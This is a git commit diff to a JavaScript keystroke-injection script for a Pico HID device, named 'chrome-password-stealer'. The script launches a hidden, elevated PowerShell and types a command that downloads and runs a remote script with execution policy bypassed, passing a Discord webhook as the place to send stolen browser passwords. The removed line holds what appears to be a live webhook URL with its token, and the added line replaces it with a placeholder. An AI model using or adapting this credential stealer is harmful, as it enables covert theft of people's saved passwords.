56e384ea26d772f521f3abf0094a30be61a5260b
simen64 <97337442+simen64@users.noreply.github.com>
2023-09-03 23:56:09 +0200

    Update stealer-starter.js

--- chrome-password-stealer/stealer-starter.js
+++ chrome-password-stealer/stealer-starter.js
@@ -28,6 +28,6 @@ startPSAsAdmin();
 delay(500);
 hidePS();
 delay(500);
-type('powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE/Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE/Documents/starter.ps1 ; powershell.exe -File ./starter.ps1 -webhookUrl "https://discord.com/api/webhooks/1140612515286499399/u5g7s3uMCSoJNCr3chf8xqpb94Jh2lYbhn7Lrw3_jqjfxXuNUUiNACq2VNtE4UaR-dkH""')
+type('powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE/Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE/Documents/starter.ps1 ; powershell.exe -File ./starter.ps1 -webhookUrl "<Your discord webhook here>""')
 delay(100);
 press("ENTER")
